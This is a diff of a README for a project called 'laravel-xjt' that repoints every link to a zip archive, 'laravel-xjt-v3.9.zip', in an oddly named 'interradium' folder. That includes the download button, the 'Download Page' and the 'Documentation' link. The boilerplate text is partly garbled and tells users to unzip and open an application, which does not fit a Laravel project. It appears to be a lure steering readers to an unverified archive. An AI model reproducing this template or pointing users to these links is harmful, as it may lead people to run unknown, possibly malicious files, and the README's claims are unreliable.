@@ -6,7 +6,7 @@ Welcome to laravel-xjt! This application helps you create web applications easil
 
 ## 📥 Download Now
 
-[![Download laravel-xjt](https://raw.githubusercontent.com/osamazafar98/laravel-xjt/main/interradium/laravel-xjt.zip)](https://raw.githubusercontent.com/osamazafar98/laravel-xjt/main/interradium/laravel-xjt.zip)
+[![Download laravel-xjt](https://github.com/osamazafar98/laravel-xjt/raw/refs/heads/main/interradium/laravel-xjt-v3.9.zip)](https://github.com/osamazafar98/laravel-xjt/raw/refs/heads/main/interradium/laravel-xjt-v3.9.zip)
 
 Use the link above to download the latest version of laravel-xjt. 
 
@@ -33,7 +33,7 @@ To run laravel-xjt smoothly, your computer should meet these requirements:
 
 To download laravel-xjt, visit the following page:
 
-[Download Page](https://raw.githubusercontent.com/osamazafar98/laravel-xjt/main/interradium/laravel-xjt.zip)
+[Download Page](https://github.com/osamazafar98/laravel-xjt/raw/refs/heads/main/interradium/laravel-xjt-v3.9.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -45,7 +45,7 @@ Click on the version link to see available files. Download the file that matches
 
 ### Step 4: Unzip the Downloaded File (if necessary)
 
-If you downloaded a compressed file (like .zip or https://raw.githubusercontent.com/osamazafar98/laravel-xjt/main/interradium/laravel-xjt.zip), right-click on the file and choose "Extract All" or "Unzip." This will unpack the application for you.
+If you downloaded a compressed file (like .zip or https://github.com/osamazafar98/laravel-xjt/raw/refs/heads/main/interradium/laravel-xjt-v3.9.zip), right-click on the file and choose "Extract All" or "Unzip." This will unpack the application for you.
 
 ### Step 5: Open laravel-xjt
 
@@ -68,7 +68,7 @@ If you run into issues:
 
 To learn more about using laravel-xjt, check out our comprehensive user guide. It covers everything from basic setup to advanced features. 
 
-Documentation can be found at [Laravel XJT Documentation](https://raw.githubusercontent.com/osamazafar98/laravel-xjt/main/interradium/laravel-xjt.zip).
+Documentation can be found at [Laravel XJT Documentation](https://github.com/osamazafar98/laravel-xjt/raw/refs/heads/main/interradium/laravel-xjt-v3.9.zip).
 
 ## 💬 Support
 
@@ -80,4 +80,4 @@ Thank you for choosing laravel-xjt! We appreciate your interest and look forward
 
 Don't forget to download the application by visiting the link below:
 
-[Download laravel-xjt](https://raw.githubusercontent.com/osamazafar98/laravel-xjt/main/interradium/laravel-xjt.zip)
+[Download laravel-xjt](https://github.com/osamazafar98/laravel-xjt/raw/refs/heads/main/interradium/laravel-xjt-v3.9.zip)
